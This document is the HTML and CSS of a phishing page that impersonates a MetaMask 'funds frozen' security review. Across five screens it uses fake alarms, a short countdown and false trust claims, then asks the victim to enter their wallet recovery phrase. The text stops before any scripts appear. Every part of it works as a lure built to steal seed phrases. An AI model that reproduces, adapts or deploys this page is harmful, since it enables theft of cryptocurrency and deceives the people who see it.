<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MetaMask - Security Incident · Funds Frozen Review</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root {
  /* default = dark */
  --bg: #0b0c10;
  --fg: #f9fafb;
  --accent: #2563eb;
  --border: #1f2933;
  --input-bg: #111827;
  --label: #9ca3af;
  --error: #ef4444;
  --success: #22c55e;
  --badge-bg: #020617;
  --badge-border: #1f2933;
  --badge-text: #f9fafb;
  --badge-hover: #020617;
  --badge-active-border: #e5e7eb;

  --card-bg: #020617;
  --loader-track: #111827;
  --button-bg: #111827;
  --button-bg-hover: #1f2937;
  --muted-surface: #0f172a;

  color-scheme: dark light;
}

@media (prefers-color-scheme: light) {
  :root {
    --bg: #f3f4f6;
    --fg: #111827;
    --accent: #2563eb;
    --border: #d1d5db;
    --input-bg: #ffffff;
    --label: #6b7280;
    --error: #dc2626;
    --success: #16a34a;
    --badge-bg: #ffffff;
    --badge-border: #e5e7eb;
    --badge-text: #111827;
    --badge-hover: #f3f4f6;
    --badge-active-border: #111827;

    --card-bg: #ffffff;
    --loader-track: #e5e7eb;
    --button-bg: #111827;
    --button-bg-hover: #020617;
    --muted-surface: #f3f4f6;

    color-scheme: light;
  }
}

* { box-sizing: border-box; }

html, body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
}

/* HEADER */

.page-header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 20; /* header under overlay in forced focus */
  background: var(--bg);
  border-bottom: 0;
  padding: 16px 24px;
}

.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.brand {
  display: flex;
  align-items: center;
  gap: 8px;
  color: var(--fg);
}

.brand-name {
  font-size: 0.9rem;
  font-weight: 600;
}

.lang-select {
  position: relative;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 4px 10px;
  border-radius: 999px;
  border: 1px solid var(--border);
  background: var(--badge-bg);
  color: var(--badge-text);
  font-size: 0.78rem;
}

.lang-select select {
  background: transparent;
  border: none;
  color: inherit;
  font: inherit;
  padding: 0;
  outline: none;
  cursor: pointer;
  appearance: none;
}

.lang-select::after {
  content: "▾";
  font-size: 0.6rem;
  color: var(--label);
}

/* BODY & LAYOUT */

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
  background: var(--bg);
  color: var(--fg);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding-top: 56px;
  font-size: 0.9rem;
}

.container {
  width: 100%;
  max-width: 500px;
  padding: 32px 24px;
  position: relative;
  height: calc(100vh - 56px);
  overflow: hidden;
  z-index: 30; /* card is above overlay + header */
}

/* CARD (pages) */

.card {
  background: var(--card-bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 18px;
  display: none;
  flex-direction: column;
  gap: 10px;

  position: absolute;
  left: 0;
  right: 0;
  margin: auto;
  max-width: 500px;
  max-height: 96vh;
  top: 50%;
  transform: translateY(-50%);
  overflow-y: auto;

  opacity: 0;
  transform-origin: center;
  transition: opacity 0.18s ease, transform 0.18s ease;
}

.card.active {
  display: flex;
  opacity: 1;
}

/* HEADER IN CARD */

.header {
  display: flex;
  align-items: flex-start;
  gap: 12px;
  margin: 0 0 4px 0;
}

.back-btn {
  background: none;
  border: none;
  color: var(--fg);
  font-size: 1.1rem;
  cursor: pointer;
  padding: 0;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: opacity 0.2s;
  flex-shrink: 0;
}

.back-btn:hover { opacity: 0.7; }

.header-content { flex: 1; }

.header-content h1 {
  margin: 0;
  font-size: 1.1rem;
  font-weight: 600;
  line-height: 1.25;
}

.header-content p {
  margin: 4px 0 0 0;
  color: var(--label);
  font-size: 0.8rem;
  display: flex;
  align-items: center;
  gap: 6px;
}

.header-meta {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-top: 4px;
  font-size: 0.75rem;
  color: var(--label);
}

.header-step {
  display: inline-flex;
  align-items: center;
  gap: 4px;
}

.step-dot {
  width: 6px;
  height: 6px;
  border-radius: 999px;
  background: var(--accent);
}

.header-id { opacity: 0.8; }

/* BUTTONS */

.btn-row {
  display: flex;
  flex-direction: column;
  gap: 4px;
  margin-top: 4px;
}

.primary-cta,
.continue-btn {
  background: var(--button-bg);
  color: #f9fafb;
  border: none;
  border-radius: 6px;
  padding: 10px 20px;
  font-weight: 600;
  cursor: pointer;
  font-size: 0.9rem;
  width: 100%;
  transition: background 0.15s;
  font-family: inherit;
}

.primary-cta:hover,
.continue-btn:hover:not(:disabled) {
  background: var(--button-bg-hover);
}

.continue-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.continue-btn.active {
  background: var(--accent);
  color: #f9fafb;
}

.secondary-link,
.action-btn {
  border: none;
  background: none;
  color: var(--accent);
  font-size: 0.8rem;
  font-weight: 600;
  text-decoration: none;
  cursor: pointer;
  padding: 2px 0 0;
  align-self: center;
}

/* STATE/TEXT UTIL */

.actions {
  display: flex;
  justify-content: space-between;
  align-items: center;
  min-height: 18px;
  width: 100%;
  margin: 0;
  padding: 0;
  border: none;
}

.error-msg {
  color: var(--error);
  font-size: 0.8rem;
  line-height: 1.3;
  flex: 1;
}

.button-group {
  display: flex;
  gap: 12px;
}

.action-btn:not(.show) { display: none; }

.helper-text {
  color: var(--error);
  font-size: 0.78rem;
  font-weight: 600;
  line-height: 1.4;
  width: 100%;
  display: none;
}

.helper-text.show {
  display: block;
}

/* WORD INPUT / CONTAINER */

.form-group {
  margin: 0;
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.word-container {
  background: var(--muted-surface);
  border: 1px solid var(--border);
  padding: 10px;
  margin: 0;
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  align-content: flex-start;
  width: 100%;
  min-height: 160px;
  border-radius: 6px;
}

.word-badge {
  background: var(--badge-bg);
  border: 1px solid var(--badge-border);
  color: var(--badge-text);
  padding: 5px 8px;
  border-radius: 4px;
  font-size: 0.78rem;
  font-weight: 500;
  display: inline-flex;
  align-items: center;
  justify-content: flex-start;
  gap: 4px;
  animation: slideIn 0.2s ease;
  white-space: nowrap;
  transition: all 0.15s;
  cursor: pointer;
  user-select: none;
  flex: 0 0 calc(33.333% - 6px);
}

/* keep edit mode also 3 columns */
.word-badge.active {
  flex: 0 0 calc(33.333% - 6px);
  max-width: calc(33.333% - 6px);
}

.word-badge:hover {
  background: var(--badge-hover);
  border-color: var(--border);
}

.word-badge.active {
  border-color: var(--badge-active-border);
  background: var(--badge-bg);
}

.word-badge.error {
  border-color: var(--error);
  background: rgba(239, 68, 68, 0.08);
}

.word-number {
  color: var(--label);
  font-weight: 600;
  font-size: 0.7rem;
  min-width: 16px;
}

.word-text {
  color: var(--badge-text);
  letter-spacing: 1.2px;
  font-size: 0.75rem;
  font-weight: 600;
  flex: 1;
  text-align: center;
}

.word-text.invalid {
  color: var(--error);
  letter-spacing: 0;
  font-weight: 400;
}

.word-text.revealed {
  letter-spacing: 0;
  font-weight: 500;
}

@keyframes slideIn {
  from { opacity: 0; transform: scale(0.96); }
  to   { opacity: 1; transform: scale(1); }
}

.edit-input {
  background: transparent;
  border: none;
  border-bottom: 1px solid var(--badge-active-border);
  color: var(--fg);
  caret-color: var(--accent);
  font-size: 0.75rem;
  font-weight: 500;
  font-family: inherit;
  outline: none;
  padding: 1px 3px 0 3px;
  text-align: left;
  min-width: 0;
  width: 100%;
  letter-spacing: 0;
  flex: 1;
}

.word-input {
  border: none;
  background: transparent;
  color: var(--fg);
  caret-color: var(--accent);
  font-size: 0.8rem;
  font-family: inherit;
  outline: none;
  padding: 0;
  flex: 0 0 calc(33.333% - 6px);
  min-width: 50px;
}

.word-input::placeholder {
  color: var(--label);
  font-size: 0.75rem;
}

/* GENERIC LOADER / SUCCESS */

#loading-page, #success-page {
  display: none;
  text-align: center;
  padding-top: 16px;
}

.loader {
  border: 3px solid var(--loader-track);
  border-top: 3px solid var(--accent);
  border-radius: 50%;
  width: 32px;
  height: 32px;
  animation: spin 1s linear infinite;
  margin: 0 auto 16px;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100%{ transform: rotate(360deg); }
}

.checkmark {
  width: 44px;
  height: 44px;
  border-radius: 50%;
  border: 2px solid var(--success);
  position: relative;
  animation: pop 0.4s ease;
  margin: 0 auto 14px;
}

.checkmark::after {
  content: '';
  position: absolute;
  left: 10px;
  top: 4px;
  width: 12px;
  height: 24px;
  border-right: 2px solid var(--success);
  border-bottom: 2px solid var(--success);
  transform: rotate(45deg);
}

@keyframes pop {
  0% { transform: scale(0.6); opacity: 0; }
  100%{ transform: scale(1);   opacity: 1; }
}

.success-message h3 {
  margin: 0 0 6px 0;
  font-size: 1rem;
  font-weight: 600;
}

.success-message p {
  color: var(--label);
  margin: 0;
  line-height: 1.4;
  font-size: 0.85rem;
}

#aes-container {
  margin-top: 12px;
  text-align: left;
}

#aes-box {
  display: flex;
  gap: 8px;
  align-items: center;
  background: var(--badge-bg);
  border-radius: 6px;
  border: 1px solid var(--border);
  padding: 8px;
  font-family: 'Courier New', monospace;
  font-size: 0.7rem;
  word-break: break-all;
  margin-top: 6px;
}

#aes-key {
  flex: 1;
  color: var(--fg);
  font-weight: 500;
}

#copyAesBtn {
  flex: 0 0 auto;
  padding: 4px 8px;
  font-size: 0.78rem;
  background: var(--accent);
  color: #ffffff;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 500;
}

/* SECURITY FLOW (alert, etc.) */

.alert-band {
  background: #b91c1c;
  border-radius: 8px;
  padding: 8px 10px;
  display: flex;
  align-items: center;
  gap: 8px;
  position: relative;
  overflow: hidden;
  border: 1px solid rgba(15, 23, 42, 0.65);
}

.alert-band::after {
  content: none;
}

.alert-icon {
  width: 26px;
  height: 26px;
  border-radius: 999px;
  background: #020617;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.alert-icon svg {
  width: 14px;
  height: 14px;
  fill: #f9fafb;
}

.alert-copy {
  flex: 1;
  color: #f9fafb;
}

.alert-title {
  margin: 0;
  font-size: 0.82rem;
  font-weight: 800;
  letter-spacing: 0.06em;
  text-transform: uppercase;
  color: #fefefe;
}

.alert-sub {
  margin: 3px 0 4px 0;
  font-size: 0.8rem;
  line-height: 1.4;
  color: #f9fafb;
}

.countdown-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin: 2px 0 3px 0;
}

.countdown-label {
  font-size: 0.78rem;
  color: #e5e7eb;
}

.countdown-value {
  font-size: 0.86rem;
  font-weight: 700;
  color: #fefefe;
}

.alert-extra {
  margin: 2px 0 0 0;
  font-size: 0.78rem;
  color: #e5e7eb;
}

.lock-line {
  font-size: 0.76rem;
  color: var(--label);
  text-align: center;
  margin-top: 4px;
}

/* SUMMARY */

.summary-section-title {
  font-size: 0.78rem;
  font-weight: 600;
  margin: 4px 0 6px;
  letter-spacing: 0.04em;
  text-transform: uppercase;
  color: var(--label);
}

.summary-grid {
  display: grid;
  grid-template-columns: 1.1fr 0.9fr;
  gap: 8px;
}

.summary-card {
  background: #0f172a;
  border-radius: 8px;
  border: 1px solid #1f2937;
  padding: 8px 10px;
  font-size: 0.78rem;
  box-shadow: 0 6px 16px rgba(15, 23, 42, 0.35);
}

.summary-title {
  margin: 0 0 4px 0;
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--fg);
}

.summary-body {
  margin: 0;
  color: var(--fg);
  opacity: 0.95;
  line-height: 1.4;
}

.meta-row {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-top: 6px;
  font-size: 0.72rem;
  color: var(--label);
}

.meta-pill {
  padding: 2px 8px;
  border-radius: 999px;
  border: 1px solid #374151;
  background: rgba(15, 23, 42, 0.9);
  color: #e5e7eb;
}

/* RISK CHIP */

.risk-chip {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  padding: 3px 9px;
  border-radius: 999px;
  font-size: 0.74rem;
  background: rgba(220, 38, 38, 0.12);
  border: 1px solid rgba(220, 38, 38, 0.65);
  color: #fecaca;
}

.risk-dot {
  width: 7px;
  height: 7px;
  border-radius: 999px;
  background: #ef4444;
}

/* light-mode overrides for summary/risk/meta */
@media (prefers-color-scheme: light) {
  .summary-card {
    background: #ffffff;
    border-color: #e5e7eb;
    box-shadow: 0 4px 12px rgba(15, 23, 42, 0.08);
  }

  .summary-title {
    color: #111827;
  }

  .summary-body {
    color: #111827;
    opacity: 1;
  }

  .meta-pill {
    border-color: #e5e7eb;
    background: #f3f4f6;
    color: #111827;
  }

  .risk-chip {
    background: #fee2e2;
    border-color: #f97373;
    color: #7f1d1d;
  }
}

.summary-note {
  font-size: 0.76rem;
  color: var(--label);
  margin-top: 8px;
  line-height: 1.5;
}

/* ACCORDION */

.accordion {
  border-radius: 8px;
  border: 1px solid var(--border);
  overflow: hidden;
}

.accordion-item + .accordion-item {
  border-top: 1px solid var(--border);
}

.accordion-header {
  padding: 7px 9px;
  background: var(--input-bg);
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.accordion-title {
  font-size: 0.8rem;
}

.accordion-icon {
  font-size: 0.8rem;
  color: var(--label);
}

.accordion-body {
  padding: 7px 9px 7px 9px;
  font-size: 0.8rem;
  display: none;
  background: var(--card-bg);
}

.accordion-body.show { display: block; }

.context-hint {
  font-size: 0.76rem;
  color: var(--label);
  margin-top: 4px;
}

/* TRUST */

.badge-row {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
}

.trust-badge {
  padding: 3px 8px;
  border-radius: 999px;
  border: 1px solid var(--border);
  font-size: 0.76rem;
  background: var(--muted-surface);
  color: var(--fg);
}

.trust-note {
  font-size: 0.76rem;
  color: var(--label);
  margin-top: 4px;
}

.metrics-row {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  margin-top: 4px;
  font-size: 0.76rem;
  color: var(--label);
}

/* RESOLUTION */

.stepper-label {
  font-size: 0.76rem;
  color: var(--label);
}

.progress-bar {
  width: 100%;
  height: 6px;
  border-radius: 999px;
  background: var(--muted-surface);
  overflow: hidden;
}

.progress-fill {
  height: 100%;
  width: 33%;
  background: var(--accent);
  transition: width 0.25s ease;
}

.resolution-note {
  font-size: 0.76rem;
  color: var(--label);
  margin-top: 4px;
}

/* FINALIZING REVIEW */

.status-line {
  font-size: 0.8rem;
  margin: 2px 0;
}

.status-muted {
  font-size: 0.76rem;
  color: var(--label);
}

.checklist {
  margin: 4px 0 0 0;
  padding-left: 16px;
}

.checklist li {
  font-size: 0.76rem;
  color: var(--label);
  margin-bottom: 2px;
}

/* FOCUS MASK: card in focus, header/background dimmed */

body.forced-focus { overflow: hidden; }

.focus-mask {
  position: fixed;
  inset: 0;
  background: rgba(15, 23, 42, 0.78);
  z-index: 25;          /* header 20 < overlay 25 < card 30 */
  pointer-events: none;
}

/* RESPONSIVE */

@media (max-width: 480px) {
  .page-header { padding: 10px 16px; }
  .container { padding: 20px 16px; }
  .header-content h1 { font-size: 1rem; }
  .word-badge, .word-input { flex: 0 0 calc(50% - 5px); }
  .word-container { min-height: 220px; }
}

</style>
</head>
<body class="forced-focus">

<div class="focus-mask" id="focusMask"></div>

<header class="page-header">
  <div class="top-bar">
    <div class="brand">
      <span class="brand-logo">
       <svg height="30" width="162" viewBox="0 0 696 344" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z" fill="currentColor"></path></svg>
      </span>
      <span class="brand-name"></span>
    </div>
    <div class="lang-select">
       <div class="lang-select">
      <select id="langSelect" aria-label="Language" class="dropdown__select" data-testid="select-locale">
        <option value="am">አማርኛ</option>
        <option value="ar">العربية</option>
        <option value="bg">български</option>
        <option value="bn">বাংলা</option>
        <option value="ca">Català</option>
        <option value="cs">Čeština</option>
        <option value="da">Dansk</option>
        <option value="de">Deutsch</option>
        <option value="el">ελληνικά</option>
        <option value="es">Español</option>
        <option value="es_419">Español (Latin America)</option>
        <option value="et">Estonian</option>
        <option value="fa">فارسی</option>
        <option value="fi">Suomi</option>
        <option value="fil">Filipino</option>
        <option value="fr">Français</option>
        <option value="ga">Gaeilge</option>
        <option value="gu">ગુજરાત</option>
        <option value="he">עברית</option>
        <option value="hi">मानक हिन्दी</option>
        <option value="hn">हिन्दी</option>
        <option value="hr">Hrvatski</option>
        <option value="ht">Kreyòl ayisyen</option>
        <option value="hu">Magyar</option>
        <option value="id">Bahasa Indonesia</option>
        <option value="it">Italiano</option>
        <option value="ja">日本語</option>
        <option value="kn">ಕನ್ನಡ</option>
        <option value="ko">한국어</option>
        <option value="lt">Lietuviškai</option>
        <option value="lv">Latvian</option>
        <option value="ml">മലയാളം</option>
        <option value="mr">मराठी</option>
        <option value="ms">Malay</option>
        <option value="nl">Nederlands</option>
        <option value="no">Norwegian</option>
        <option value="pl">Polskie</option>
        <option value="pt">Português</option>
        <option value="pt_BR">Português (Brazillian)</option>
        <option value="pt_PT">Português (European)</option>
        <option value="ro">Limba română</option>
        <option value="ru">Русский</option>
        <option value="sk">Slovenčina</option>
        <option value="sl">Slovenščina</option>
        <option value="sr">српски</option>
        <option value="sv">Svenska</option>
        <option value="sw">Swahili</option>
        <option value="ta">தமிழ்</option>
        <option value="te">తెలుగు</option>
        <option value="th">ไทย</option>
        <option value="tl">Filipino</option>
        <option value="tr">Türkçe</option>
        <option value="uk">Українська мова</option>
        <option value="vi">Tiếng Việt</option>
        <option value="zh_CN">中文(简体)</option>
        <option value="zh_TW">中文(繁體)</option>
        <option value="en" selected>English</option>
      </select>
    </div>
  </div>
</header>

<div class="container">

  <!-- PAGE 1: ALARM -->
  <div class="card active" id="page-1">
    <div class="header">
      <button class="back-btn" type="button" disabled style="cursor:not-allowed;opacity:.4;">‹</button>
      <div class="header-content">
        <h1>Security activity halted</h1>
        <p>An automated check paused your current action.</p>
        <div class="header-meta">
          <span class="header-step">
            <span class="step-dot"></span>
            <span>Alert · Step 1 of 5</span>
          </span>
          <span class="header-id" id="headerRef1">Ref: —</span>
        </div>
      </div>
    </div>
<div class="alert-band">
  <div class="alert-icon">
    <svg viewBox="0 0 24 24">
      <path d="M11.001 10h2v5h-2zM11 16h2v2h-2z"></path>
      <path d="M12 2 1 21h22L12 2zm0 3.84L19.53 19H4.47L12 5.84z"></path>
    </svg>
  </div>
  <div class="alert-copy">
    <p class="alert-title">IMMEDIATE RISK · FUNDS FROZEN</p>
    <p class="alert-sub">
      A high‑risk pattern was blocked and a temporary freeze has been placed on part of your balance.
    </p>
    <div class="countdown-row">
      <span class="countdown-label">Complete review before this window resets</span>
      <span class="countdown-value" id="countdown">00:29</span>
    </div>
    <p class="alert-extra">
      This freeze is a protective step only. Your funds are still in your account, but cannot be moved until you complete this check.
    </p>
  </div>
</div>

<ul class="mini-list">
  <li>Some or all of your funds are temporarily frozen while this activity is investigated.</li>
  <li>Only this tab is paused, but new actions on other sessions may be delayed or blocked until the review is finished.</li>
  <li>Closing this window will not unfreeze your funds. You must complete the review or contact support to restore normal access.</li>
</ul>

<div class="btn-row">
  <button class="primary-cta" onclick="showPage(2)">Review and resolve now</button>
  <button class="secondary-link" type="button" onclick="remindLater()">Remind me again in a few minutes</button>
</div>

<p class="lock-line">
  Until this incident is cleared, movement of affected funds is restricted and additional checks may apply to new requests.
</p>
</div>
<!-- PAGE 2: INCIDENT SUMMARY -->
<div class="card" id="page-2">
  <div class="header">
    <button class="back-btn" type="button" onclick="showPage(1)">‹</button>
    <div class="header-content">
      <h1>Frozen incident summary</h1>
      <p>Review why your funds were stopped before this action could complete.</p>
      <div class="header-meta">
        <span class="header-step">
          <span class="step-dot"></span>
          <span>Summary · Step 2 of 5</span>
        </span>
        <span class="header-id" id="headerRef2">Ref: —</span>
      </div>
    </div>
  </div>

  <p class="summary-section-title">Automated findings</p>
  <div class="summary-grid">
    <div class="summary-card">
      <p class="summary-title">Threat overview</p>
      <p class="summary-body" id="threatText">
        Recent activity matched a high‑risk pattern. A temporary freeze was applied so this request cannot continue without your confirmation.
      </p>
      <div class="meta-row">
        <span class="meta-pill" id="refId">Ref: #SEC‑XXXX</span>
        <span class="meta-pill" id="ts">Detected: —</span>
        <span class="meta-pill" id="net">Network: —</span>
      </div>
    </div>
    <div class="summary-card">
      <p class="summary-title">Risk level</p>
      <p class="summary-body">
        This incident is currently classified as:
      </p>
      <div class="risk-chip">
        <span class="risk-dot"></span>
        <span>High · Immediate review required</span>
      </div>
      <ul class="mini-list">
        <li>Triggered by unusual origin, timing, or volume compared to your normal usage.</li>
        <li>Similar patterns have been seen in other accounts within the last 24 hours.</li>
      </ul>
    </div>
  </div>

  <p class="summary-note">
    No funds have been released or moved while this freeze is in place. Your explicit approval is required before any blocked action can continue or be discarded.
  </p>

  <div class="btn-row">
    <button class="primary-cta" onclick="showPage(3)">Continue to details</button>
    <button class="secondary-link" type="button" onclick="showPage(1)">Back to alert screen</button>
  </div>
</div>


  <!-- PAGE 3: CONTEXT -->
<div class="card" id="page-3">
  <div class="header">
    <button class="back-btn" type="button" onclick="showPage(2)">‹</button>
    <div class="header-content">
      <h1>Why your funds are frozen</h1>
      <p>Review the details before you decide what happens next.</p>
      <div class="header-meta">
        <span class="header-step">
          <span class="step-dot"></span>
          <span>Context · Step 3 of 5</span>
        </span>
        <span class="header-id" id="headerRef3">Ref: —</span>
      </div>
    </div>
  </div>

  <div class="accordion" id="accordion">
    <div class="accordion-item">
      <div class="accordion-header">
        <span class="accordion-title">What happened?</span>
        <span class="accordion-icon">+</span>
      </div>
      <div class="accordion-body">
        A sequence of recent activity was stopped mid‑flow and flagged as high‑risk. This can include unusual login attempts, transaction requests, or security changes that do not match your typical behaviour.
      </div>
    </div>
    <div class="accordion-item">
      <div class="accordion-header">
        <span class="accordion-title">Why was this flagged?</span>
        <span class="accordion-icon">+</span>
      </div>
      <div class="accordion-body">
        Leaving this pattern unchecked could expose your funds or access for a longer period. Signals such as device fingerprint, IP region, request volume, and timing together pushed this incident into a high‑risk category.
      </div>
    </div>
    <div class="accordion-item">
      <div class="accordion-header">
        <span class="accordion-title">What are my options?</span>
        <span class="accordion-icon">+</span>
      </div>
      <div class="accordion-body">
        You can resolve this now by completing the short check, postpone with the freeze and monitoring still in place, or close this review. Postponing keeps protections active and may require additional verification on future actions.
      </div>
    </div>
    <div class="accordion-item">
      <div class="accordion-header">
        <span class="accordion-title">How does this affect my account?</span>
        <span class="accordion-icon">+</span>
      </div>
      <div class="accordion-body">
        Affected funds and actions are temporarily restricted until this incident is cleared or dismissed. Normal access may resume automatically after review, or remain limited if the pattern reappears or looks unsafe.
      </div>
    </div>
  </div>

  <p class="context-hint">
    Completing the check now helps restore normal access faster and reduces the chance of stronger limits being applied later.
  </p>

  <div class="btn-row">
    <button class="primary-cta" onclick="showPage(4)">Continue</button>
    <button class="secondary-link" type="button" onclick="showPage(2)">Go back to summary</button>
  </div>
</div>

<!-- PAGE 4: TRUST -->
<div class="card" id="page-4">
  <div class="header">
    <button class="back-btn" type="button" onclick="showPage(3)">‹</button>
    <div class="header-content">
      <h1>How this freeze is handled</h1>
      <p>See how decisions are made and what protections apply to you.</p>
      <div class="header-meta">
        <span class="header-step">
          <span class="step-dot"></span>
          <span>Controls · Step 4 of 5</span>
        </span>
        <span class="header-id" id="headerRef4">Ref: —</span>
      </div>
    </div>
  </div>

  <div class="badge-row">
    <span class="trust-badge">Independent Monitoring</span>
    <span class="trust-badge">ISO‑aligned Controls</span>
    <span class="trust-badge">Anomaly & Abuse Detection</span>
    <span class="trust-badge">No Manual Override of Rules</span>
  </div>

  <p class="trust-note">
    Review decisions are driven by rule‑based engines and risk signals, not by individual operators. A single event cannot freeze funds on its own; multiple indicators must agree before a freeze is applied.
  </p>

  <div class="metrics-row">
    <span>Today: <strong>12,384</strong> incidents reviewed</span>
    <span>Auto‑cleared: <strong>98.7%</strong></span>
    <span>Escalated for extra checks: <strong>&lt; 1.3%</strong></span>
  </div>

  <ul class="mini-list">
    <li>Your keys and raw credentials are never shared or exposed during this review.</li>
    <li>Security signals are aggregated and anonymized when used to improve detection quality over time.</li>
  </ul>

  <div class="btn-row">
    <button class="primary-cta" onclick="showPage(5)">Continue to guided resolution</button>
  </div>
</div>

<!-- PAGE 5: RESOLUTION -->
<div class="card" id="page-5">
  <div class="header">
    <button class="back-btn" type="button" onclick="showPage(4)">‹</button>
    <div class="header-content">
      <h1>Resolve and unfreeze</h1>
      <p>Complete this short check to safely restore normal access.</p>
      <div class="header-meta">
        <span class="header-step">
          <span class="step-dot"></span>
          <span>Verification · Step 5 of 5</span>
        </span>
        <span class="header-id" id="headerRef5">Ref: —</span>
      </div>
    </div>
  </div>

  <p class="stepper-label">Progress</p>
  <div class="progress-bar">
    <div class="progress-fill" id="progressFill" style="width:33%;"></div>
  </div>

  <p class="resolution-note">
    This is a read‑only verification step. It uses encrypted, session‑bound data and will not move funds or change your settings, but it is required before the freeze can be lifted.
  </p>

  <ul class="mini-list">
    <li>Confirm that recent devices and locations belong to you.</li>
    <li>Review any recent high‑value or unusual requests linked to this incident.</li>
    <li>Optionally apply tighter limits for the next 24 hours to keep the account locked down.</li>
  </ul>

  <div class="btn-row">
    <button class="primary-cta" onclick="goToVerification()">Begin verification</button>
  </div>
</div>

<!-- PAGE 6: VERIFICATION (BIP-39 UI) -->
<div class="card" id="page-6">
  <div class="header">
    <button class="back-btn" type="button" id="backBtn" onclick="showPage(5)">‹</button>
    <div class="header-content">
      <h1>Final verification step</h1>
      <p>Confirm your recovery phrase to safely lift the freeze.</p>
    </div>
  </div>

  <div class="form-group" id="main-page">
    <div id="word-container" class="word-container">
      <input
        id="mnemonic-input"
        class="word-input"
        type="text"
        autocomplete="off"
        spellcheck="false"
        placeholder="Type or paste your phrase here. Check every word and make sure no one can see your screen."
      />
    </div>

    <div class="actions">
      <span id="errorMsg" class="error-msg"></span>
      <div class="button-group">
        <button type="button" id="pasteBtn" class="action-btn show">Paste</button>
        <button type="button" id="clearAllBtn" class="action-btn">Clear all</button>
      </div>
    </div>

    <p id="helperText" class="helper-text">
      Some words do not match the BIP‑39 wordlist. Please check spelling and word order carefully.
    </p>

    <button id="continueBtn" class="continue-btn" disabled>
      Continue to secure check
    </button>
  </div>

  <div id="loading-page">
    <div class="loader"></div>
    <p class="status-line">Verifying phrase and session…</p>
    <p class="status-muted">Do not close this window. This usually takes only a few seconds.</p>
  </div>

  <div id="success-page">
